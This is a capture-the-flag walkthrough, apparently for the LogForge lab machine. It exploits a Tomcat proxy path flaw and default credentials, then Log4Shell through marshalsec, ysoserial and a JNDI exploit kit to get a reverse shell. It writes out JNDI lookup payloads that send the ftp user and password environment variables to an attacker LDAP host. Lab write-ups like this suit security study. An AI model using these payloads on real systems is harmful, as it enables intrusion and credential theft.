# LogForge

![LogForge.png](LogForge/LogForge.png)

### 12/24/2021

![Untitled](LogForge/Untitled.png)

This is a tomcat server

![Untitled](LogForge/Untitled%201.png)

Because the server has a tomcat but in response shows apache2, it’s probably reversing proxys we can use orange tsai lfi.

![Untitled](LogForge/Untitled%202.png)

The login credential of the panel is tomcat:tomcat.

![Untitled](LogForge/Untitled%203.png)

Look my netcat receive the connection from the tomcat

![Untitled](LogForge/Untitled%204.png)

Reproducing Log4J with base in this github

[https://github.com/xiajun325/apache-log4j-rce-poc](https://github.com/xiajun325/apache-log4j-rce-poc)

So git clone the marshalsec repository

```python
git clone https://github.com/mbechler/marshalsec
```

After that install the maven

```python
sudo apt-get install maven
```

After that compile the java package, Maven is a build automation tool used primarily used in Java Projects. 

```python
mvn clean package -DskipTests
```

![Untitled](LogForge/Untitled%205.png)

The reverse shell not work, probably we must have to use the Ysoserial modified sending serialized objects.

In the Isoserial we can look the help returning in the screen:

![Untitled](LogForge/Untitled%206.png)

So now I created a java serialized object:

![Untitled](LogForge/Untitled%207.png)

Running LNDI exploit:

![Untitled](LogForge/Untitled%208.png)

```python
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.26:1389 -P ~/Desktop/YSO5.ser
```

After some tries it works: Simple i change the payload to the curl executing a bash.

![Untitled](LogForge/Untitled%209.png)

Python server to receive the GET:

![Untitled](LogForge/Untitled%2010.png)

JNDI exploit kit:

![Untitled](LogForge/Untitled%2011.png)

Reverse shell:

![Untitled](LogForge/Untitled%2012.png)

In the following steps we have to decompile the ftpServer to look at somethings. The server is running on root user.

![Untitled](LogForge/Untitled%2013.png)

It uses log4j again.

![Untitled](LogForge/Untitled%2014.png)

We need to abuse of environment variables:

![Untitled](LogForge/Untitled%2015.png)

To extract this we will use the wireshark and do a little change in the payload: With that we can grab the ftp_user environment.

```python
${jndi:ldap://10.10.14.26:1389/${env:ftp_user}}
```

Wireshark with filter to point to port 1389.

Inserting payload in ftp:

![Untitled](LogForge/Untitled%2016.png)

It returns the user in the request:

![Untitled](LogForge/Untitled%2017.png)

Password:

```python
${jndi:ldap://10.10.14.26:1389/${env:ftp_password}}
```

![Untitled](LogForge/Untitled%2018.png)

log4j_env_leakage

Other options to exfiltrate:

![Untitled](LogForge/Untitled%2019.png)